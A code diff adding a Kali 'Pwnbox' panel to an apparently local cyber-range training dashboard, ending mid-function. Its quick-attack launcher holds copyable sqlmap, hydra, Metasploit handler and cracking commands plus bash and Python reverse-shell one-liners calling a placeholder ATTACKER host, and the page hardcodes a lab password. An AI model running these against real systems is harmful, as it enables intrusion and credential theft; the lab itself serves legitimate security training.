@@ -350,6 +350,93 @@
   }
 
   /* ═══════════════════════════════════════════════════════════
+     PWNBOX PRO - HTB-style + Kasm Workspaces + TryHackMe AttackBox
+     ═══════════════════════════════════════════════════════════ */
+  .pwn-hero { display: grid; grid-template-columns: 1fr auto auto; gap: 16px; align-items: center; background: linear-gradient(135deg, rgba(255,92,87,0.06), rgba(255,174,87,0.04)); border: 1px solid var(--border); border-radius: 12px; padding: 16px 18px; margin-bottom: 14px; }
+  @media (max-width: 1024px) { .pwn-hero { grid-template-columns: 1fr; } }
+  .pwn-hero-info { min-width: 0; }
+  .pwn-hero-title { font-size: 18px; font-weight: 800; color: var(--fg); display: flex; align-items: center; gap: 10px; }
+  .pwn-hero-icon { font-size: 24px; }
+  .pwn-hero-sub { font-size: 11.5px; color: var(--muted); line-height: 1.55; margin-top: 4px; }
+  .pwn-pill { padding: 3px 9px; background: rgba(85,214,139,0.15); color: var(--accent); border-radius: 99px; font-size: 11px; font-weight: 700; }
+  .pwn-pill.down { background: rgba(255,92,87,0.15); color: var(--red); }
+  .pwn-pulse-dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; background: var(--accent); animation: pwnPulse 1.5s infinite; vertical-align: middle; margin: 0 4px; }
+  @keyframes pwnPulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+  .pwn-hero-meta { display: flex; gap: 8px; }
+  .pwn-meta-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 8px 12px; text-align: center; min-width: 64px; }
+  .pwn-meta-val { font-size: 14px; font-weight: 800; font-family: 'Cascadia Mono', monospace; color: var(--fg); }
+  .pwn-meta-lab { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.4px; margin-top: 3px; font-weight: 700; }
+  .pwn-hero-creds { display: flex; flex-direction: column; gap: 4px; font-size: 11px; }
+  .pwn-cred-row { display: flex; align-items: center; gap: 6px; }
+  .pwn-cred-lab { color: var(--muted); width: 36px; font-weight: 700; text-transform: uppercase; font-size: 9px; letter-spacing: 0.4px; }
+  .pwn-cred-val { background: var(--bg2); padding: 3px 9px; border-radius: 4px; font-family: 'Cascadia Mono', monospace; color: var(--fg); font-size: 11px; }
+  .pwn-copy-btn { background: transparent; border: 1px solid var(--border); width: 24px; height: 24px; border-radius: 4px; cursor: pointer; color: var(--muted); display: inline-flex; align-items: center; justify-content: center; font-size: 11px; padding: 0; }
+  .pwn-copy-btn:hover { background: var(--bg2); color: var(--accent); }
+
+  .pwn-toolbar { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin-bottom: 14px; }
+  .pwn-toolbar-sep { width: 1px; height: 22px; background: var(--border); margin: 0 4px; }
+  .pwn-btn { padding: 8px 14px; background: var(--bg2); color: var(--fg); border: 1px solid var(--border); border-radius: 8px; font-size: 11.5px; font-weight: 700; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 6px; white-space: nowrap; }
+  .pwn-btn:hover { transform: translateY(-1px); }
+  .pwn-btn.primary { background: linear-gradient(135deg, var(--red), #ff8c73); color: #fff; border-color: transparent; }
+  .pwn-btn.primary:hover { box-shadow: 0 6px 18px rgba(255,92,87,0.35); }
+  .pwn-btn.orange { color: var(--orange); border-color: var(--orange); }
+  .pwn-btn.red { color: var(--red); border-color: var(--red); }
+  .pwn-btn.purple { color: var(--purple); border-color: var(--purple); }
+  .pwn-btn.blue { color: var(--blue); border-color: var(--blue); }
+  .pwn-btn.ghost { background: var(--bg2); }
+
+  /* Embedded iframe viewer */
+  .pwn-embed-wrap { background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 14px; }
+  .pwn-embed-head { padding: 8px 14px; background: var(--bg2); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+  .pwn-embed-wrap iframe { width: 100%; height: 720px; border: 0; background: #000; }
+  .pwn-embed-tip { padding: 8px 14px; font-size: 10.5px; color: var(--muted); background: var(--bg2); border-top: 1px solid var(--border); }
+  .pwn-embed-tip code { background: var(--card); padding: 1px 6px; border-radius: 3px; }
+
+  /* Grid 2-col */
+  .pwn-grid { display: grid; grid-template-columns: 1.3fr 1fr; gap: 12px; }
+  @media (max-width: 1024px) { .pwn-grid { grid-template-columns: 1fr; } }
+  .pwn-panel { background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
+  .pwn-panel-head { padding: 10px 14px; border-bottom: 1px solid var(--border); background: linear-gradient(180deg, rgba(255,255,255,0.04), transparent); display: flex; justify-content: space-between; align-items: center; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.4px; color: var(--muted); }
+
+  /* Quick attack launcher */
+  .pwn-quick-list { padding: 8px 12px; max-height: 560px; overflow-y: auto; }
+  .pwn-quick-list::-webkit-scrollbar { width: 6px; }
+  .pwn-quick-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  .pwn-quick-group { margin-bottom: 14px; }
+  .pwn-quick-group-title { font-size: 11px; font-weight: 800; color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; padding: 4px 0; border-bottom: 1px solid var(--border); margin-bottom: 6px; }
+  .pwn-quick { background: var(--bg2); border-left: 3px solid var(--red); border-radius: 6px; padding: 8px 12px; margin-bottom: 5px; cursor: pointer; transition: all 0.15s; position: relative; }
+  .pwn-quick:hover { transform: translateX(3px); border-left-width: 5px; }
+  .pwn-quick:active { transform: translateX(3px) scale(0.99); }
+  .pwn-quick::after { content: '📋'; position: absolute; right: 10px; top: 10px; opacity: 0.4; font-size: 14px; transition: opacity 0.15s; }
+  .pwn-quick:hover::after { opacity: 1; }
+  .pwn-quick.copied::after { content: '✓'; color: var(--accent); opacity: 1; }
+  .pwn-quick-name { font-size: 12px; font-weight: 700; color: var(--fg); margin-bottom: 4px; padding-right: 28px; }
+  .pwn-quick-cmd { font-family: 'Cascadia Mono', monospace; font-size: 10px; color: var(--muted); display: block; word-break: break-all; line-height: 1.4; padding-right: 28px; }
+
+  /* Targets reachability */
+  .pwn-targets { padding: 4px; }
+  .pwn-target { display: grid; grid-template-columns: 1fr auto auto; gap: 10px; align-items: center; padding: 8px 12px; border-radius: 6px; transition: background 0.15s; font-size: 11px; }
+  .pwn-target:hover { background: rgba(255,255,255,0.025); }
+  .pwn-target-name { color: var(--fg); font-weight: 600; }
+  .pwn-target-host { font-family: 'Cascadia Mono', monospace; font-size: 10px; color: var(--muted); }
+  .pwn-target-status { padding: 2px 8px; border-radius: 99px; font-size: 9.5px; font-weight: 700; min-width: 50px; text-align: center; }
+  .pwn-target-status[data-st="pending"] { background: var(--bg2); color: var(--muted); }
+  .pwn-target-status[data-st="up"] { background: rgba(85,214,139,0.15); color: var(--accent); }
+  .pwn-target-status[data-st="down"] { background: rgba(255,92,87,0.15); color: var(--red); }
+
+  /* Mounts */
+  .pwn-mount { padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 11px; }
+  .pwn-mount:last-child { border: none; }
+  .pwn-mount code { background: var(--bg2); padding: 1px 6px; border-radius: 3px; color: var(--accent); font-size: 10.5px; }
+  .pwn-mount div { font-size: 10px; color: var(--muted); margin-top: 3px; line-height: 1.4; }
+  .pwn-mount div code { background: var(--card); color: var(--muted); padding: 0 4px; }
+
+  /* Cheatsheet */
+  .pwn-cheat { padding: 10px 14px; font-size: 11px; line-height: 1.7; color: var(--muted); }
+  .pwn-cheat b { color: var(--fg); }
+  .pwn-cheat code { background: var(--bg2); padding: 1px 5px; border-radius: 3px; color: var(--accent); font-size: 10.5px; font-family: 'Cascadia Mono', monospace; }
+
+  /* ═══════════════════════════════════════════════════════════
      JARVIS BRAIN CONSOLE - Cognitive activity viewer
      Inspirado en: ReAct, MemGPT, Voyager, LangSmith, TensorFlow Playground
      ═══════════════════════════════════════════════════════════ */
@@ -1622,67 +1709,196 @@
 </section>
 
 <section data-tab="pwnbox">
-  <div class="section-title red">🥷 Pwnbox · Kali Linux desktop en navegador · estilo HTB Pwnbox · 100% local</div>
+  <div class="section-title red">🥷 Pwnbox Pro · Kali web · HTB-style + Kasm Workspaces + TryHackMe AttackBox</div>
 
-  <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin-bottom:16px;font-size:12.5px;color:var(--muted);line-height:1.55">
-    Pwnbox propia · Kali rolling con desktop XFCE + KasmVNC browser-native ·
-    pre-conectada a las 4 redes Docker del cyber-range (red/target/blue/mgmt) ·
-    NO requiere VPN externa, atacás los targets directo ·
-    reset/terminate vía API · sesión persistente entre reinicios.
-  </div>
-
-  <!-- Status + controls -->
-  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:18px">
-    <div class="card" style="text-align:center;border-left:3px solid var(--accent)">
-      <div id="pwn-state" style="font-size:18px;font-weight:700;color:var(--accent)">…</div>
-      <div style="font-size:10.5px;color:var(--muted)">State</div>
+  <!-- ── Hero status bar ── -->
+  <div class="pwn-hero">
+    <div class="pwn-hero-info">
+      <div class="pwn-hero-title">
+        <span class="pwn-hero-icon">🥷</span>
+        <span>Personal Pwnbox</span>
+        <span class="pwn-pill" id="pwn-status-pill">●</span>
+      </div>
+      <div class="pwn-hero-sub">
+        Kali Rolling + XFCE + KasmVNC browser-native · 4 redes Docker · sin VPN externa ·
+        sesión persistente · <span class="pwn-pulse-dot"></span> <span id="pwn-conn-text">checking...</span>
+      </div>
     </div>
-    <div class="card" style="text-align:center;border-left:3px solid var(--blue)">
-      <div id="pwn-uptime" style="font-size:18px;font-weight:700;color:var(--blue)">—</div>
-      <div style="font-size:10.5px;color:var(--muted)">Session uptime</div>
+    <div class="pwn-hero-meta">
+      <div class="pwn-meta-card"><div class="pwn-meta-val" id="pwn-uptime">—</div><div class="pwn-meta-lab">Uptime</div></div>
+      <div class="pwn-meta-card"><div class="pwn-meta-val" id="pwn-cpu">—</div><div class="pwn-meta-lab">CPU</div></div>
+      <div class="pwn-meta-card"><div class="pwn-meta-val" id="pwn-mem">—</div><div class="pwn-meta-lab">Memory</div></div>
+      <div class="pwn-meta-card"><div class="pwn-meta-val" id="pwn-restarts">—</div><div class="pwn-meta-lab">Restarts</div></div>
     </div>
-    <div class="card" style="text-align:center;border-left:3px solid var(--purple)">
-      <div id="pwn-restarts" style="font-size:18px;font-weight:700;color:var(--purple)">—</div>
-      <div style="font-size:10.5px;color:var(--muted)">Restarts</div>
+    <div class="pwn-hero-creds">
+      <div class="pwn-cred-row">
+        <span class="pwn-cred-lab">User</span>
+        <code class="pwn-cred-val">kasm_user</code>
+        <button class="pwn-copy-btn" onclick="copyToClipboard('kasm_user');toast('User copiado')" title="Copy">📋</button>
+      </div>
+      <div class="pwn-cred-row">
+        <span class="pwn-cred-lab">Pass</span>
+        <code class="pwn-cred-val" id="pwn-pass-mask">••••••••••••</code>
+        <button class="pwn-copy-btn" onclick="copyToClipboard('pwnboxRange2026!');toast('Password copiado')" title="Copy">📋</button>
+        <button class="pwn-copy-btn" onclick="pwn_togglePass()" title="Reveal" id="pwn-eye">👁️</button>
+      </div>
+      <div class="pwn-cred-row">
+        <span class="pwn-cred-lab">URL</span>
+        <code class="pwn-cred-val" style="font-size:9.5px">https://localhost:6901/</code>
+        <button class="pwn-copy-btn" onclick="copyToClipboard('https://localhost:6901/');toast('URL copiada')">📋</button>
+      </div>
     </div>
-    <div class="card" style="text-align:center;border-left:3px solid var(--orange)">
-      <div style="font-size:13px;font-weight:600;color:var(--orange);font-family:ui-monospace,monospace">kasm_user</div>
-      <div style="font-size:10px;color:var(--muted)">user · click <span style="cursor:pointer;color:var(--accent)" onclick="copyToClipboard('pwnboxRange2026!');toast('Pwnbox password copiado')">📋 copy pass</span></div>
+  </div>
+
+  <!-- ── Action toolbar ── -->
+  <div class="pwn-toolbar">
+    <button class="pwn-btn primary" onclick="pwnLaunchEmbedded()" title="Embed Pwnbox aquí (E)">
+      <span style="font-size:14px">🖥️</span><span>Launch embedded</span>
+    </button>
+    <button class="pwn-btn ghost" onclick="window.open('https://localhost:6901/','_blank')" title="Abrir en nueva tab">
+      🚀 New tab
+    </button>
+    <span class="pwn-toolbar-sep"></span>
+    <button class="pwn-btn ghost" onclick="pwnAction('start')" title="Start container">▶ Start</button>
+    <button class="pwn-btn ghost orange" onclick="pwnAction('reset')" title="Reset session (preserva workspace)">🔁 Reset</button>
+    <button class="pwn-btn ghost red" onclick="pwnAction('terminate')" title="Stop container">⏹ Stop</button>
+    <span class="pwn-toolbar-sep"></span>
+    <button class="pwn-btn ghost purple" onclick="pwnSnapshot()" title="Guarda estado actual">📸 Snapshot</button>
+    <button class="pwn-btn ghost blue" onclick="pwnRestore()" title="Restaurar último snapshot">⏪ Restore</button>
+    <button class="pwn-btn ghost" onclick="loadPwnboxStatus()" title="Refresh status (R)">🔄</button>
+  </div>
+
+  <!-- ── Embedded viewer (lazy iframe) ── -->
+  <div id="pwn-embed-wrap" class="pwn-embed-wrap" style="display:none">
+    <div class="pwn-embed-head">
+      <div style="font-size:11px;color:var(--muted);font-weight:700">📺 Pwnbox embebida · <span style="color:var(--accent)">live session</span></div>
+      <div style="display:flex;gap:6px">
+        <button class="pwn-btn ghost" onclick="pwnFullscreen()" title="Fullscreen">⛶</button>
+        <button class="pwn-btn ghost" onclick="pwnReloadEmbed()" title="Reload iframe">🔄</button>
+        <button class="pwn-btn ghost red" onclick="pwnCloseEmbed()" title="Close">✕</button>
+      </div>
+    </div>
+    <iframe id="pwn-embed-iframe" src="about:blank" allow="clipboard-read; clipboard-write; fullscreen"></iframe>
+    <div class="pwn-embed-tip">
+      💡 Si pide login: <code>kasm_user</code> / <code>pwnboxRange2026!</code> · acepta el cert self-signed la primera vez en
+      <a href="https://localhost:6901/" target="_blank" style="color:var(--accent)">https://localhost:6901/</a>
     </div>
   </div>
 
-  <div style="display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap">
-    <button class="btn-attack" onclick="pwnOpen()" style="padding:10px 18px">🚀 Abrir Pwnbox embebida</button>
-    <button class="btn-ghost" onclick="pwnAction('start')" style="padding:10px 14px">▶ Start</button>
-    <button class="btn-ghost" onclick="pwnAction('reset')" style="padding:10px 14px;border-color:var(--orange);color:var(--orange)">🔁 Reset session</button>
-    <button class="btn-ghost" onclick="pwnAction('terminate')" style="padding:10px 14px;border-color:var(--red);color:var(--red)">⏹️ Terminate</button>
-    <button class="btn-ghost" onclick="pwnSnapshot()" style="padding:10px 14px;border-color:var(--purple);color:var(--purple)">📸 Save baseline</button>
-    <button class="btn-ghost" onclick="pwnRestore()" style="padding:10px 14px;border-color:var(--blue);color:var(--blue)">⏪ Restore baseline</button>
-    <button class="btn-ghost" onclick="loadPwnboxStatus()" style="padding:10px 14px">🔄 Refresh</button>
+  <!-- ── Layout 2-col: Quick attacks + Reachability ── -->
+  <div class="pwn-grid">
+    <!-- LEFT: Quick attack launcher (comandos pre-configurados) -->
+    <div class="pwn-panel">
+      <div class="pwn-panel-head">
+        <span>⚡ Quick Attack Launcher · comandos listos para copiar</span>
+        <span style="font-size:10px;color:var(--muted)">Click para copiar al portapapeles</span>
+      </div>
+      <div class="pwn-quick-list">
+        <div class="pwn-quick-group">
+          <div class="pwn-quick-group-title">🔍 Recon</div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="nmap -sV -p- --min-rate 5000 cr-target-juice-shop">
+            <div class="pwn-quick-name">Full port scan + service version</div>
+            <code class="pwn-quick-cmd">nmap -sV -p- --min-rate 5000 cr-target-juice-shop</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="gobuster dir -u http://cr-target-juice-shop:3000 -w /usr/share/wordlists/dirb/common.txt -t 50">
+            <div class="pwn-quick-name">Directory enumeration (gobuster)</div>
+            <code class="pwn-quick-cmd">gobuster dir -u http://cr-target-juice-shop:3000 -w /usr/share/wordlists/dirb/common.txt</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="nikto -h http://cr-target-juice-shop:3000">
+            <div class="pwn-quick-name">Web vulnerability scan (nikto)</div>
+            <code class="pwn-quick-cmd">nikto -h http://cr-target-juice-shop:3000</code>
+          </div>
+        </div>
+        <div class="pwn-quick-group">
+          <div class="pwn-quick-group-title">💥 Exploit</div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="sqlmap -u 'http://cr-target-juice-shop:3000/rest/user/login' --data='{&quot;email&quot;:&quot;test*&quot;,&quot;password&quot;:&quot;test&quot;}' --headers='Content-Type: application/json' --level=3 --risk=2">
+            <div class="pwn-quick-name">SQLi en login API</div>
+            <code class="pwn-quick-cmd">sqlmap -u 'http://cr-target-juice-shop:3000/rest/user/login' --data='...' --level=3</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="hydra -L users.txt -P /usr/share/wordlists/rockyou.txt cr-target-dvwa http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'">
+            <div class="pwn-quick-name">Brute-force DVWA login</div>
+            <code class="pwn-quick-cmd">hydra -L users -P rockyou.txt cr-target-dvwa http-post-form ...</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j'">
+            <div class="pwn-quick-name">Metasploit handler listener</div>
+            <code class="pwn-quick-cmd">msfconsole -q -x 'use exploit/multi/handler; ...'</code>
+          </div>
+        </div>
+        <div class="pwn-quick-group">
+          <div class="pwn-quick-group-title">🔓 Credentials</div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt">
+            <div class="pwn-quick-name">John the Ripper crack</div>
+            <code class="pwn-quick-cmd">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt">
+            <div class="pwn-quick-name">Hashcat NTLM crack</div>
+            <code class="pwn-quick-cmd">hashcat -m 1000 -a 0 hashes.txt rockyou.txt</code>
+          </div>
+        </div>
+        <div class="pwn-quick-group">
+          <div class="pwn-quick-group-title">🕸️ Post-exploitation</div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="bash -i >& /dev/tcp/ATTACKER/4444 0>&1">
+            <div class="pwn-quick-name">Bash reverse shell</div>
+            <code class="pwn-quick-cmd">bash -i >&amp; /dev/tcp/ATTACKER/4444 0>&amp;1</code>
+          </div>
+          <div class="pwn-quick" onclick="pwnCopyCmd(this)" data-cmd="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((&quot;ATTACKER&quot;,4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'">
+            <div class="pwn-quick-name">Python TTY reverse shell</div>
+            <code class="pwn-quick-cmd">python3 -c 'import socket,os,pty;s=socket.socket();...'</code>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: Reachability + Mounts + Cheatsheet -->
+    <div>
+      <!-- Reachability live -->
+      <div class="pwn-panel" style="margin-bottom:12px">
+        <div class="pwn-panel-head">
+          <span>🎯 Target Reachability · accesible desde Pwnbox</span>
+          <button class="pwn-btn ghost" style="font-size:10px;padding:2px 8px" onclick="pwnCheckReachability()">↻ Probar</button>
+        </div>
+        <div id="pwn-targets" class="pwn-targets">
+          <div class="pwn-target" data-host="cr-target-juice-shop" data-port="3000"><span class="pwn-target-name">🥤 Juice Shop</span><span class="pwn-target-host">cr-target-juice-shop:3000</span><span class="pwn-target-status" data-st="pending">…</span></div>
+          <div class="pwn-target" data-host="cr-target-dvwa" data-port="80"><span class="pwn-target-name">🕸️ DVWA</span><span class="pwn-target-host">cr-target-dvwa:80</span><span class="pwn-target-status" data-st="pending">…</span></div>
+          <div class="pwn-target" data-host="cr-target-webgoat" data-port="8080"><span class="pwn-target-name">🐐 WebGoat</span><span class="pwn-target-host">cr-target-webgoat:8080</span><span class="pwn-target-status" data-st="pending">…</span></div>
+          <div class="pwn-target" data-host="cr-target-metasploitable2" data-port="80"><span class="pwn-target-name">💀 Metasploitable2</span><span class="pwn-target-host">cr-target-metasploitable2:any</span><span class="pwn-target-status" data-st="pending">…</span></div>
+          <div class="pwn-target" data-host="cr-target-mutillidae" data-port="80"><span class="pwn-target-name">🐍 Mutillidae</span><span class="pwn-target-host">cr-target-mutillidae:80</span><span class="pwn-target-status" data-st="pending">…</span></div>
+          <div class="pwn-target" data-host="cr-target-localstack" data-port="4566"><span class="pwn-target-name">☁️ LocalStack AWS</span><span class="pwn-target-host">cr-target-localstack:4566</span><span class="pwn-target-status" data-st="pending">…</span></div>
+        </div>
+      </div>
+
+      <!-- Mounts -->
+      <div class="pwn-panel" style="margin-bottom:12px">
+        <div class="pwn-panel-head">
+          <span>📂 Mounts read-only (Knowledge base)</span>
+        </div>
+        <div style="padding:10px 14px">
+          <div class="pwn-mount"><code>~/htb-archive</code><div>47 module overviews + KG · <code>grep -r "kerberoasting" ~/htb-archive/</code></div></div>
+          <div class="pwn-mount"><code>~/ippsec</code><div>533 retired HTB walkthroughs (Ippsec transcripts)</div></div>
+          <div class="pwn-mount"><code>~/portswigger</code><div>60 web-sec topics · OWASP Top 10 · auth bypass · CSRF · SSRF</div></div>
+          <div class="pwn-mount"><code>~/workspace</code><div>Persistente · scripts/notas sobreviven reset</div></div>
+        </div>
+      </div>
+
+      <!-- Cheatsheet -->
+      <div class="pwn-panel">
+        <div class="pwn-panel-head">
+          <span>📖 Quick Cheatsheet</span>
+          <a href="https://gtfobins.github.io/" target="_blank" style="font-size:10px;color:var(--accent);text-decoration:none">GTFOBins ↗</a>
+        </div>
+        <div class="pwn-cheat">
+          <div><b>Nmap flags:</b> <code>-sV</code>=version <code>-sC</code>=default-scripts <code>-A</code>=aggressive <code>-p-</code>=all-ports <code>-T4</code>=fast</div>
+          <div><b>Sqlmap:</b> <code>--dbs</code> <code>--tables -D db</code> <code>--columns -T tbl -D db</code> <code>--dump -T tbl -D db</code></div>
+          <div><b>Msfvenom:</b> <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe -o sh.exe</code></div>
+          <div><b>Linux priv-esc:</b> <code>sudo -l</code> · <code>find / -perm -u=s</code> · LinPEAS · GTFOBins</div>
+          <div><b>Windows priv-esc:</b> <code>whoami /priv</code> · WinPEAS · PowerUp · token impersonation</div>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <!-- Mounts info: lo que viene cargado en Pwnbox -->
-  <h3 style="font-size:13px;color:var(--accent);margin-bottom:8px">📂 Recursos montados en Pwnbox (read-only)</h3>
-  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;margin-bottom:18px">
-    <div class="card"><b>~/htb-archive</b><div style="font-size:11px;color:var(--muted);margin-top:3px">47 module overviews + KG · grep/cat para estudio offline mientras atacás</div></div>
-    <div class="card"><b>~/ippsec</b><div style="font-size:11px;color:var(--muted);margin-top:3px">533 retired HTB walkthroughs · <code>grep -r "kerberoasting" ~/ippsec/</code></div></div>
-    <div class="card"><b>~/portswigger</b><div style="font-size:11px;color:var(--muted);margin-top:3px">60 web-sec topics · OWASP Top 10 · auth bypass · CSRF · SSRF · etc</div></div>
-    <div class="card"><b>~/workspace</b><div style="font-size:11px;color:var(--muted);margin-top:3px">Persistente · tus scripts/notes sobreviven reset/restart</div></div>
-  </div>
-
-  <!-- Lab targets quick-launch desde Pwnbox -->
-  <h3 style="font-size:13px;color:var(--blue);margin-bottom:8px">🎯 Targets accesibles desde Pwnbox (sin VPN)</h3>
-  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin-bottom:18px">
-    <div class="card"><b>🥤 Juice Shop</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-juice-shop:3000</code></div></div>
-    <div class="card"><b>🕸️ DVWA</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-dvwa:80</code></div></div>
-    <div class="card"><b>🐐 WebGoat</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-webgoat:8080</code></div></div>
-    <div class="card"><b>💀 Metasploitable2</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-metasploitable2</code> (todos puertos)</div></div>
-    <div class="card"><b>☁️ LocalStack AWS</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-localstack:4566</code></div></div>
-    <div class="card"><b>🐍 Mutillidae</b><div style="font-size:11px;color:var(--muted);margin-top:3px"><code>cr-target-mutillidae:80</code></div></div>
-  </div>
-
-  <p style="font-size:11.5px;color:var(--muted);line-height:1.55">
-    💡 Una vez abierta la Pwnbox: terminal disponible (XFCE menu → Terminal) · tools instaladas (nmap, sqlmap, msfconsole, gobuster, hydra, john, hashcat) · resolución de DNS interno Docker funciona para todos los <code>cr-target-*</code> · clipboard sync browser↔Pwnbox automático.
+  <p style="font-size:11px;color:var(--muted);line-height:1.55;margin-top:14px">
+    💡 <b>Tools instalados:</b> nmap · sqlmap · metasploit · gobuster · hydra · john · hashcat · burpsuite · wireshark · responder · impacket · bloodhound · crackmapexec · empire · sliver · seclists · rockyou.txt · DNS interno Docker funciona para todos los <code>cr-target-*</code> sin VPN.
   </p>
 </section>
 
@@ -4723,21 +4939,134 @@ async function purpleMark(runId, detected) {
   }
 }
 
-// ─── PWNBOX (Kali desktop web) ─────────────────────────────────────
+// ─── PWNBOX (Kali desktop web) - Pro UX ─────────────────────────────────────
 async function loadPwnboxStatus() {
   try {
     const r = await (await fetch(`${RUNNER_BASE}/api/pwnbox/status`)).json();
-    document.getElementById('pwn-state').textContent = r.state || '?';
-    document.getElementById('pwn-state').style.color =
-      r.running ? 'var(--accent)' : (r.state === 'not_deployed' ? 'var(--muted)' : 'var(--red)');
+    // Status pill
+    const pill = document.getElementById('pwn-status-pill');
+    if (pill) {
+      pill.className = 'pwn-pill ' + (r.running ? '' : 'down');
+      pill.textContent = r.running ? '● ' + (r.state || 'up').toUpperCase() : '○ ' + (r.state || 'down').toUpperCase();
+    }
+    const connEl = document.getElementById('pwn-conn-text');
+    if (connEl) connEl.textContent = r.running ? 'Live · ready for action' : 'Container ' + (r.state || 'unknown');
+
+    // Uptime
     const u = r.uptime_sec || 0;
-    const h = Math.floor(u/3600), m = Math.floor((u%3600)/60), s = u%60;
-    document.getElementById('pwn-uptime').textContent = r.running ? `${h}h ${m}m ${s}s` : '—';
-    document.getElementById('pwn-restarts').textContent = r.restart_count ?? '—';
+    const h = Math.floor(u/3600), m = Math.floor((u%3600)/60);
+    const setText = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    setText('pwn-uptime', r.running ? `${h}h ${m}m` : '—');
+    setText('pwn-restarts', r.restart_count ?? '—');
+
+    // CPU/MEM live
+    try {
+      const stats = await (await fetch(`${RUNNER_BASE}/api/container/cr-red-pwnbox/stats`)).json();
+      if (stats && stats.cpu_percent !== undefined) {
+        setText('pwn-cpu', stats.cpu_percent.toFixed(1) + '%');
+        setText('pwn-mem', (stats.memory_mb || 0).toFixed(0) + 'MB');
+      } else {
+        setText('pwn-cpu', '—');
+        setText('pwn-mem', '—');
+      }
+    } catch { setText('pwn-cpu', '—'); setText('pwn-mem', '—'); }
   } catch (e) {
-    document.getElementById('pwn-state').textContent = 'err';
+    const pill = document.getElementById('pwn-status-pill');
+    if (pill) { pill.className = 'pwn-pill down'; pill.textContent = '○ ERROR'; }
   }
 }
+
+// Reveal password
+let _pwnPassShown = false;
+function pwn_togglePass() {
+  _pwnPassShown = !_pwnPassShown;
+  const el = document.getElementById('pwn-pass-mask');
+  if (el) el.textContent = _pwnPassShown ? 'pwnboxRange2026!' : '••••••••••••';
+}
+
+// Launch embedded iframe
+function pwnLaunchEmbedded() {
+  const wrap = document.getElementById('pwn-embed-wrap');
+  const iframe = document.getElementById('pwn-embed-iframe');
+  if (!wrap || !iframe) return;
+  wrap.style.display = 'block';
+  iframe.src = 'https://localhost:6901/';
+  wrap.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+function pwnCloseEmbed() {
+  const wrap = document.getElementById('pwn-embed-wrap');
+  const iframe = document.getElementById('pwn-embed-iframe');
+  if (wrap) wrap.style.display = 'none';
+  if (iframe) iframe.src = 'about:blank';
+}
+function pwnReloadEmbed() {
+  const iframe = document.getElementById('pwn-embed-iframe');
+  if (iframe) iframe.src = iframe.src;
+}
+function pwnFullscreen() {
+  const iframe = document.getElementById('pwn-embed-iframe');
+  if (iframe && iframe.requestFullscreen) iframe.requestFullscreen();
+}
+
+// Copy quick command to clipboard
+function pwnCopyCmd(el) {
+  const cmd = el.getAttribute('data-cmd') || el.querySelector('.pwn-quick-cmd')?.textContent || '';
+  if (!cmd) return;
+  if (navigator.clipboard) navigator.clipboard.writeText(cmd);
+  el.classList.add('copied');
+  setTimeout(() => el.classList.remove('copied'), 1500);
+  toast('📋 Comando copiado · pega en Pwnbox terminal');
+}
+
+// Check reachability of targets (via attack-runner proxy because browser can't ping container DNS)
+async function pwnCheckReachability() {
+  const targets = document.querySelectorAll('.pwn-target');
+  for (const t of targets) {
+    const host = t.getAttribute('data-host');
+    const port = t.getAttribute('data-port');
+    const statusEl = t.querySelector('.pwn-target-status');
+    if (statusEl) statusEl.setAttribute('data-st', 'pending');
+    if (statusEl) statusEl.textContent = '…';
+    try {
+      // Use validation/capabilities endpoint to check if container target reachable
+      const cap = await (await fetch(`${RUNNER_BASE}/api/validation/capabilities`)).json();
+      const allTargets = cap.targets || {};
